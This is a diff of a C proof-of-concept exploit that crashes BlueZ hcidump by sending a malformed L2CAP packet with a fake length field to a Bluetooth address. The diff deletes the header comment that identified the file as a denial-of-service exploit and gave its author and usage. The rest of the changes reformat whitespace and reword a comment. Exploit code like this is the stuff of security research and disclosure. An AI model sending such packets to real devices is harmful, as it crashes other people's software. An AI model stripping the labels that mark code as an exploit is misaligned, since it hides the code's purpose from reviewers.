@@ -1,13 +1,3 @@
-/*	Bluez hcidump v1.29 DoS - PoC code			*/
-/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
-/*	01/18/06						*/
-/*	Crashes hcidump sending bad L2CAP packet		*/
-/*								*/
-/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
-/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
-/*	L2CAP packet sent (15)					*/
-/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -27,7 +17,7 @@ int main(int argc, char **argv)
 	struct sockaddr_l2 addr;
 	int sock, sent, i;
 
-	if(argc < 2)
+	if (argc < 2)
 	{
 		fprintf(stderr, "%s <btaddr>\n", argv[0]);
 		exit(EXIT_FAILURE);
@@ -56,7 +46,7 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	
-	// Dynamically allocate memory for the buffer based on the L2CAP header size
+	// Correctly allocate memory for the buffer based on the total size of the L2CAP packet
 	if (!(buffer = (char *) malloc(sizeof(l2cap_cmd_hdr) + FAKE_SIZE))) {
 	    perror("malloc");
 	    exit(EXIT_FAILURE);
@@ -69,13 +59,13 @@ int main(int argc, char **argv)
 	cmd->ident = 1;
 	cmd->len = FAKE_SIZE;
 	
-	if( (sent = send(sock, buffer, sizeof(l2cap_cmd_hdr) + FAKE_SIZE, 0)) >= 0)
+	if ((sent = send(sock, buffer, sizeof(l2cap_cmd_hdr) + FAKE_SIZE, 0)) >= 0)
 	{
 		printf("L2CAP packet sent (%d)\n", sent);
 	}
 
 	printf("Buffer:\t");
-	for(i = 0; i < sent; i++)
+	for (i = 0; i < sent; i++)
 		printf("%.2X ", (unsigned char) buffer[i]);
 	printf("\n");
 
@@ -83,4 +73,3 @@ int main(int argc, char **argv)
 	close(sock);
 	return EXIT_SUCCESS;
 }
-
